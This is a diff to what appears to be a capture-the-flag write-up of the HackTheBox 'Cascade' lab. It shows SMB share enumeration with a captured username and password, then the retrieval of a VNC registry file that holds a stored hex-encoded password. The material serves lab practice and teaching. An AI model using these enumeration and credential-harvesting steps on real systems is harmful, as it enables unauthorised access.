@@ -41,6 +41,63 @@ rY4n5eva
 
 └─# smbmap -u r.thompson -p rY4n5eva -H 10.10.10.182
 
+└─# smbclient -U r.thompson //10.10.10.182/Data
+Enter WORKGROUP\r.thompson's password: 
+Try "help" to get a list of possible commands.
+smb: \> recurse
+smb: \> dir
+  Contractors                         D        0  Mon Jan 13 04:45:11 2020
+  Finance                             D        0  Mon Jan 13 04:45:06 2020
+  IT                                  D        0  Tue Jan 28 21:04:51 2020
+  Production                          D        0  Mon Jan 13 04:45:18 2020
+  Temps                               D        0  Mon Jan 13 04:45:15 2020
+
+\Contractors
+NT_STATUS_ACCESS_DENIED listing \Contractors\*
+
+\Finance
+NT_STATUS_ACCESS_DENIED listing \Finance\*
+
+\IT
+  Email Archives                      D        0  Tue Jan 28 21:00:30 2020
+  LogonAudit                          D        0  Tue Jan 28 21:04:40 2020
+  Logs                                D        0  Wed Jan 29 03:53:04 2020
+  Temp                                D        0  Wed Jan 29 01:06:59 2020
+
+\Production
+NT_STATUS_ACCESS_DENIED listing \Production\*
+
+\Temps
+NT_STATUS_ACCESS_DENIED listing \Temps\*
+
+\IT\Email Archives
+  Meeting_Notes_June_2018.html       An     2522  Tue Jan 28 21:00:12 2020
+
+\IT\LogonAudit
+
+\IT\Logs
+  Ark AD Recycle Bin                  D        0  Fri Jan 10 19:33:45 2020
+  DCs                                 D        0  Wed Jan 29 03:56:00 2020
+
+\IT\Temp
+  r.thompson                          D        0  Wed Jan 29 01:06:53 2020
+  s.smith                             D        0  Tue Jan 28 23:00:01 2020
+
+\IT\Logs\Ark AD Recycle Bin
+  ArkAdRecycleBin.log                 A     1303  Wed Jan 29 04:19:11 2020
+
+\IT\Logs\DCs
+  dcdiag.log                          A     5967  Fri Jan 10 19:17:30 2020
+
+\IT\Temp\r.thompson
+
+\IT\Temp\s.smith
+  VNC Install.reg                     A     2680  Tue Jan 28 22:27:44 2020
+
+└─# cat VNC\ Install.reg 
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
+"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
 
 References :
 https://blog.luckolen.xyz/posts/HTB/Cascade
